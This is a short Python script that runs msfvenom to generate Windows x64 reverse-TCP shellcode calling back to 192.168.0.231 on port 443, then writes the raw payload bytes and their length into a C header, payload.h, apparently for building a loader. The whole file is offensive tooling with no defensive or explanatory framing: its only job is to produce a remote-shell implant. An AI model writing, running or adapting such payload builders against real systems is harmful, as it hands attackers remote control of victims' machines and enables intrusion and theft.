import subprocess
import re

def generate_shellcode():
    # Define the msfvenom command
    cmd = [
        "msfvenom",
        "-p", "windows/x64/shell/reverse_tcp",
        "LHOST=192.168.0.231",
        "LPORT=443",
        "-a", "x64",
        "-f", "c",
        "-v", "payload"
    ]
    
    # Execute the command and get the output
    try:
        shellcode_output = subprocess.check_output(cmd, stderr=subprocess.STDOUT, text=True)
        return shellcode_output
    except subprocess.CalledProcessError as e:
        print(f"An error occurred: {str(e)}")
        return None

def extract_payload_size(shellcode_output):
    # Extract the payload size using regex
    payload_size_pattern = re.compile(r"Payload size: (\d+) bytes")
    match = payload_size_pattern.search(shellcode_output)
    if match:
        return match.group(1)
    else:
        return None

def write_shellcode_to_file(shellcode_output, payload_size):
    # print(f"Type Shellcode output :{type(shellcode_output)}")
    if shellcode_output:
        # Write the shellcode and payload size to payload.txt
        with open("payload.h", "w") as f:
            f.write(f"unsigned int payload_len = {payload_size};\n")
            payload_found = False
            for line in shellcode_output.split('\n'):
                if "unsigned" in line:
                    # f.write(line + '\n\n')
                    payload_found = True
                if payload_found:
                   f.write(line + '\n')
            # f.write(shellcode_output)

if __name__ == "__main__":
    shellcode_output = generate_shellcode()
    payload_size = extract_payload_size(shellcode_output)
    write_shellcode_to_file(shellcode_output, payload_size)
